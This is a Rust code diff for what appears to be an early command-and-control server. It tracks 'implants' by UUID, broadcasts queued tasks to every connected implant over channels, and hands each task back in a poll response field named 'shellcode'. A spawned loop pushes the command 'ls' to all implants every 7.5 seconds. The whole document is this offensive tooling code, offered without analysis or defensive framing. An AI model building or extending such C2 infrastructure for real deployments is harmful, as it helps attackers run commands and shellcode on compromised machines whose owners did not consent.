@@ -1,6 +1,12 @@
-use std::collections::{HashMap, VecDeque};
+use std::{
+    collections::{HashMap, VecDeque},
+    sync::Arc,
+};
 
-use tokio::sync::RwLock;
+use tokio::sync::{
+    mpsc::{channel, Receiver, Sender},
+    RwLock,
+};
 use tonic::{transport::Server, Request, Response, Status};
 use uuid::Uuid;
 
@@ -15,18 +21,31 @@ pub mod tasks {
 type Task = String;
 const HEARTBEAT: u32 = 5000; // TODO: variable heartbeat config for implant
 
-#[derive(Debug, Default)]
+#[derive(Debug)]
 pub struct Implant {
-    tasks: VecDeque<Task>,
+    pub tasks: (Sender<Task>, Receiver<Task>),
 }
 
 #[derive(Debug, Default)]
 pub struct Beacon {
     implants: RwLock<HashMap<Uuid, Implant>>,
 }
+impl Beacon {
+    pub async fn add_task(&self, task: Task) {
+        let mut map = self.implants.write().await;
+
+        for (_, val) in map.iter_mut() {
+            val.tasks
+                .0
+                .send(task.clone())
+                .await
+                .expect("Channel send failure.");
+        }
+    }
+}
 
 #[tonic::async_trait]
-impl BeaconService for Beacon {
+impl BeaconService for Arc<Beacon> {
     async fn connection(
         &self,
         _request: Request<ConnectionRequest>,
@@ -36,7 +55,7 @@ impl BeaconService for Beacon {
         println!("Got a connection request");
 
         let mut map = self.implants.write().await;
-        map.insert(id, Implant::default());
+        map.insert(id, Implant { tasks: channel(5) });
 
         Ok(Response::new(ConnectionResponse {
             uuid: id.to_string(),
@@ -55,7 +74,7 @@ impl BeaconService for Beacon {
         let mut map = self.implants.write().await;
         Ok(Response::new(PollResponse {
             shellcode: match map.get_mut(&id.unwrap()) {
-                Some(v) => v.tasks.pop_front(),
+                Some(v) => v.tasks.1.recv().await,
                 None => {
                     return Err(Status::not_found(
                         "Client doesn't exist or isn't connected.",
@@ -69,7 +88,15 @@ impl BeaconService for Beacon {
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let addr = "[::1]:50055".parse()?;
-    let beacon = Beacon::default();
+    let beacon = Arc::new(Beacon::default());
+    let b2 = beacon.clone();
+
+    tokio::spawn(async move {
+        loop {
+            tokio::time::sleep(std::time::Duration::from_millis(7500)).await;
+            b2.add_task("ls".to_string()).await;
+        }
+    });
 
     Server::builder()
         .add_service(BeaconServiceServer::new(beacon))
